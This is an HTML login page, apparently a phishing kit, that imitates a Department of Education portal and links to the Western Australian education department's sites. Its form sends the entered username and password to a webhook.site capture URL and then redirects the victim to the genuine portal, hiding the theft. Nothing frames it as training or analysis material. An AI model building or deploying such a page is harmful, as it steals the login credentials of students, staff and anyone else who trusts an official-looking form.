<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Department of Education Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            font-size: 14px;
            color: #333;
            display: block;
            margin-bottom: 6px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #005a8e;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .footer a {
            color: #0078d4;
            text-decoration: none;
        }
        .logo {
            display: block;
            margin: 20px auto;
            width: 100px; /* You can adjust the size of the logo */
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Department Logo -->
        <img src="https://example.com/dept-logo.png" alt="Department of Education Logo" class="logo"> <!-- Replace with actual logo URL -->

        <h2>Department of Education Login</h2>
        <form action="https://webhook.site/4fc45ded-d691-4520-ad22-a0941714bc2e/401b3f4b-7555-476b-9153-01355711e044/1" method="POST" onsubmit="window.location.href = 'https://connect.det.wa.edu.au/'; return true;">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Login">
        </form>
    </div>

    <!-- Footer Section -->
    <div class="footer">
        <p>&copy; 2025 Department of Education. All rights reserved.</p>
        <p><a href="https://www.det.wa.edu.au/">Department of Education Official Website</a></p>
    </div>
</body>
</html>
